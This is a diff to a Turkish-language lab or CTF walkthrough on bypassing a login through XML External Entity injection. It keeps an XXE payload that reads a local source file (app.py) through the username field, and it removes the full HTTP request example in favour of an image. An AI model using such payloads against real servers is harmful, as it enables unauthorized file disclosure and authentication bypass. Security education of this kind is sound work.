@@ -71,11 +71,12 @@ Hedefimiz, kaynak kodunu okumak. Bu sayede logini aşacak bir adım bulabiliriz.
   <!ELEMENT password (#PCDATA)>
   <!ENTITY xxe SYSTEM "file:///path/to/app.py">
 ]>
-<login>
+<credentials>
   <username>&xxe;</username>
   <password>dummy</password>
-</login>
+</credentials>
 ```
+
 
 Bu payload şunları yapar:
 
@@ -91,23 +92,10 @@ Bu payload'ı, bir araç kullanarak (ör. **Burp Suite**, **Postman**) şu şeki
 
 **HTTP İsteği:**
 
-```http
-POST /login HTTP/1.1
-Host: target-lab
-Content-Type: application/xml
+![image](https://github.com/user-attachments/assets/5eca91d2-5888-4784-99b4-825e39f28c74)
 
-<!DOCTYPE foo [
-  <!ELEMENT username (#PCDATA)>
-  <!ELEMENT password (#PCDATA)>
-  <!ENTITY xxe SYSTEM "file:///path/to/app.py">
-]>
-<login>
-  <username>&xxe;</username>
-  <password>dummy</password>
-</login>
-```
 
-Elde edilen yanıt, `flag.txt` dosyasının içeriğini gösterecektir:
+Elde edilen yanıt, `app.py` dosyasının içeriğini gösterecektir:
 
 ```xml
 <result>
